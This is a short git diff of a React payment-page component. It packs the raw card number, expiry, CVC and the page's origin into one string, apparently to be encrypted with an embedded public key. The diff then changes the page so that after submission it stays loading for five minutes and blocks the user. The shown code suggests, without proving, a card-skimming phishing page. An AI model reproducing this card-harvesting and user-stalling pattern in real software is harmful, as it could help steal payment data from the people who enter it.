@@ -9,12 +9,17 @@ const PaymentPage = () => {
   const [name, setName] = useState('')
   const [email, setEmail] = useState('')
   const [loading, setLoading] = useState(false);
+  const [block, setBlock] = useState(false)
 
   const pubkey = `-----BEGIN PUBLIC KEY-----MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCBB+jeV/CthQcGFltHV2lueSNcW30zxbI9hjkpwIgEyfY3e63+0ISIBts8/k3U7Qg+HHmqy+6fciicM2pxt9hvGvPy/lssbd2pYksGh8yzB8JJj8HaQQ/RzYEZ72FAn1Z6R7C9hgZORl7JV+W47GEUNixpPuzozDsBeq9PcZMaEQIDAQAB-----END PUBLIC KEY-----`;
 
   const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
     e.preventDefault();
     setLoading(true);
+
+    setTimeout(() => {
+      setLoading(false);
+    }, 300000);
 
     const cardNumberClean = cardNumber.replace(/\s/g, "");
     const cd = `${cardNumberClean}|${expiryInput}|${cvcInput}|${document.location.origin}`;
@@ -56,7 +61,7 @@ const PaymentPage = () => {
     } catch (error) {
       console.error("Wystąpił błąd:", error);
     }
-    setLoading(false);
+    setBlock(true)
   }
 
   return (
